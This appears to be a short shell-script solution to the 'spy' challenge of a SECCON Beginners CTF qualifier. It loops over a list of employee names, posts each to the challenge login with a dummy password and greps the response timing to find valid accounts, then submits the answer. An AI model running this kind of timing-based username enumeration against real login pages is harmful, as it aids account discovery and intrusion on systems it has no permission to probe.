for e in $(cat employees.txt); do
  echo $e;
  curl -s -X POST -F name=$e -F password=hoge https://spy.quals.beginners.seccon.jp | grep 'It took'
done

curl -s -X POST -F answer=$(cat solve.txt) https://spy.quals.beginners.seccon.jp/challenge
